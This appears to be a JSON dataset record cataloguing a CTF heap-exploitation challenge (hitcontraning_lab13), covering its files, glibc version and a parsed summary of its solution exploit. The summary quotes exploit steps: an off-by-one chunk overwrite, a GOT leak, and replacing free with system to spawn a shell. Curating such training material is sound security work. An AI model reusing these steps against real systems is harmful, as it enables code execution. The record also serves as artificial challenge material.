@@ -1,0 +1,338 @@
+{
+  "schema_version": "1.0",
+  "case_id": "heap-ctf-wiki-hitcontraning-lab13-bae716d5",
+  "source": {
+    "repository_url": "https://github.com/ctf-wiki/ctf-challenges",
+    "commit_sha": "18d67d158d0729fca20597723c763f475f7968cd",
+    "challenge_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13",
+    "ctf": null,
+    "year": null,
+    "year_provenance": null,
+    "challenge_name": "hitcontraning_lab13",
+    "license": null,
+    "source_class": "curator_archive"
+  },
+  "target": {
+    "arch": "amd64",
+    "os": "linux",
+    "binary_sha256": "bae716d582d0070fdf1121b55871ab07c37f135a48ce68b5830e013fd3d59398",
+    "libc_sha256": "05b841eae6f475817ebb3b99562cd6535cc61b099350a25019cd5d3b3136881d",
+    "ld_sha256": null
+  },
+  "glibc": {
+    "version": "2.23",
+    "confidence": "HIGH",
+    "evidence": [
+      "banner string parsed from shipped pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/libc.so.6 (GNU C Library, Ubuntu GLIBC 2.23-0ubuntu10)"
+    ]
+  },
+  "heap": {
+    "confidence": "HIGH",
+    "evidence": [
+      {
+        "class": "source_binary",
+        "kind": "allocator_api_in_source",
+        "detail": [
+          {
+            "file": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.c",
+            "allocator_api_calls": 4
+          }
+        ]
+      },
+      {
+        "class": "source_binary",
+        "kind": "binary_heap_semantics",
+        "detail": {
+          "binary": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator",
+          "allocator_dynsym_imports": [
+            "free",
+            "malloc"
+          ],
+          "heap_string_hits": [],
+          "dynamic_glibc_ref": true
+        }
+      },
+      {
+        "class": "exp",
+        "kind": "exp_script_heap_semantics",
+        "detail": [
+          {
+            "file": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/exp.py",
+            "heap_relevant": true,
+            "reason": "heap_keywords",
+            "heap_kw_hits": [
+              "# trigger heap 1's struct to fastbin 0x40",
+              "# heap 1's content to fastbin 0x20"
+            ],
+            "io_calls": true
+          }
+        ]
+      }
+    ],
+    "techniques": [],
+    "technique_provenance": {}
+  },
+  "files": [
+    {
+      "path": "original/challenge/heapcreator",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator",
+      "sha256": "bae716d582d0070fdf1121b55871ab07c37f135a48ce68b5830e013fd3d59398",
+      "size": 13480
+    },
+    {
+      "path": "original/challenge/heapcreator.c",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.c",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.c",
+      "sha256": "40f9508c8207f8211582c4d0dd5bece1fbb077b8d5adf370f471a3ffed4ba704",
+      "size": 2860
+    },
+    {
+      "path": "original/challenge/heapcreator.i64",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.i64",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator.i64",
+      "sha256": "7f5c9d6ae01460556cb754c4d8f7bfe6b20f8cdebc6f091586ec2a632a5f0a55",
+      "size": 181639
+    },
+    {
+      "path": "original/challenge/libc.so.6",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/libc.so.6",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/libc.so.6",
+      "sha256": "05b841eae6f475817ebb3b99562cd6535cc61b099350a25019cd5d3b3136881d",
+      "size": 1868984
+    },
+    {
+      "path": "original/challenge/Makefile",
+      "role": "challenge",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/Makefile",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/Makefile",
+      "sha256": "c4ff67a8875e1cd3807d00d3d1d70d57a8b851155ab364cba6a3ff610644cab0",
+      "size": 62
+    },
+    {
+      "path": "original/solution/exp.py",
+      "role": "solution",
+      "repo_relative_path": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/exp.py",
+      "source_url": "https://github.com/ctf-wiki/ctf-challenges/blob/18d67d158d0729fca20597723c763f475f7968cd/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/exp.py",
+      "sha256": "f62b4802233364f9d704b35709e2ed131752814de2bb4f3388280ae1b247f089",
+      "size": 1720
+    }
+  ],
+  "exp_analysis": {
+    "entry_file": "pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13/exp.py",
+    "parse_ok": true,
+    "imports_pwntools": true,
+    "helpers": [
+      {
+        "function": "create",
+        "source_line": 11,
+        "end_line": 17,
+        "parameter_names": [
+          "size",
+          "content"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "r.recvuntil(\":\")",
+          "r.sendline(\"1\")",
+          "r.recvuntil(\":\")",
+          "r.sendline(str(size))",
+          "r.recvuntil(\":\")",
+          "r.sendline(content)"
+        ],
+        "menu_strings": [
+          ":",
+          "1",
+          ":",
+          ":"
+        ],
+        "operation": "alloc",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "edit",
+        "source_line": 20,
+        "end_line": 26,
+        "parameter_names": [
+          "idx",
+          "content"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "r.recvuntil(\":\")",
+          "r.sendline(\"2\")",
+          "r.recvuntil(\":\")",
+          "r.sendline(str(idx))",
+          "r.recvuntil(\":\")",
+          "r.sendline(content)"
+        ],
+        "menu_strings": [
+          ":",
+          "2",
+          ":",
+          ":"
+        ],
+        "operation": "edit",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "show",
+        "source_line": 29,
+        "end_line": 33,
+        "parameter_names": [
+          "idx"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "r.recvuntil(\":\")",
+          "r.sendline(\"3\")",
+          "r.recvuntil(\":\")",
+          "r.sendline(str(idx))"
+        ],
+        "menu_strings": [
+          ":",
+          "3",
+          ":"
+        ],
+        "operation": "show",
+        "confidence": "HIGH"
+      },
+      {
+        "function": "delete",
+        "source_line": 36,
+        "end_line": 40,
+        "parameter_names": [
+          "idx"
+        ],
+        "calls": [
+          "recvuntil",
+          "sendline",
+          "str"
+        ],
+        "io_call_examples": [
+          "r.recvuntil(\":\")",
+          "r.sendline(\"4\")",
+          "r.recvuntil(\":\")",
+          "r.sendline(str(idx))"
+        ],
+        "menu_strings": [
+          ":",
+          "4",
+          ":"
+        ],
+        "operation": "free",
+        "confidence": "HIGH"
+      }
+    ],
+    "candidate_operations": [
+      {
+        "operation": "alloc",
+        "helper": "create",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:11 def create(size, content)",
+          "io: r.recvuntil(\":\")",
+          "io: r.sendline(\"1\")"
+        ]
+      },
+      {
+        "operation": "edit",
+        "helper": "edit",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:20 def edit(idx, content)",
+          "io: r.recvuntil(\":\")",
+          "io: r.sendline(\"2\")"
+        ]
+      },
+      {
+        "operation": "show",
+        "helper": "show",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:29 def show(idx)",
+          "io: r.recvuntil(\":\")",
+          "io: r.sendline(\"3\")"
+        ]
+      },
+      {
+        "operation": "free",
+        "helper": "delete",
+        "confidence": "HIGH",
+        "evidence": [
+          "exp.py:36 def delete(idx)",
+          "io: r.recvuntil(\":\")",
+          "io: r.sendline(\"4\")"
+        ]
+      }
+    ],
+    "aliases": [],
+    "wrappers": [],
+    "call_examples": [
+      {
+        "helper": "create",
+        "source_line": 44,
+        "call": "create(0x18, \"dada\")"
+      },
+      {
+        "helper": "create",
+        "source_line": 45,
+        "call": "create(0x10, \"ddaa\")"
+      },
+      {
+        "helper": "edit",
+        "source_line": 47,
+        "call": "edit(0, \"/bin/sh\\x00\" + \"a\" * 0x10 + \"\\x41\")"
+      },
+      {
+        "helper": "delete",
+        "source_line": 50,
+        "call": "delete(1)"
+      },
+      {
+        "helper": "create",
+        "source_line": 55,
+        "call": "create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))"
+      },
+      {
+        "helper": "show",
+        "source_line": 57,
+        "call": "show(1)"
+      },
+      {
+        "helper": "edit",
+        "source_line": 67,
+        "call": "edit(1, p64(system_addr))"
+      },
+      {
+        "helper": "delete",
+        "source_line": 69,
+        "call": "delete(0)"
+      }
+    ],
+    "loops": [],
+    "correctness": "UNVERIFIED"
+  },
+  "quality": {
+    "tier": "GOLD",
+    "issues": [
+      "exp_correctness_unverified"
+    ]
+  }
+}
